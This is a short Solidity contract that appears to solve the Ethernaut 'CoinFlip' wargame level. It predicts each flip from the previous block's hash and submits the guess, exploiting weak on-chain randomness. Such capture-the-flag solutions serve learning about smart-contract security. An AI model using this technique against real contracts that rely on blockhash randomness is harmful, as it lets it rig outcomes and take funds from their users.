// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TwoLevelEthernaut.sol";

contract LomaemContract {
    CoinFlip public twoLevelEthernaut;

    bool public side;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _twoEthernaut) {
        twoLevelEthernaut = CoinFlip(_twoEthernaut);
    }

    function podschet() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip_ = blockValue / FACTOR;
        side = coinFlip_ == 1 ? true : false;

        return side;
    }

    function getWin() external {
        twoLevelEthernaut.flip(podschet());
    }
}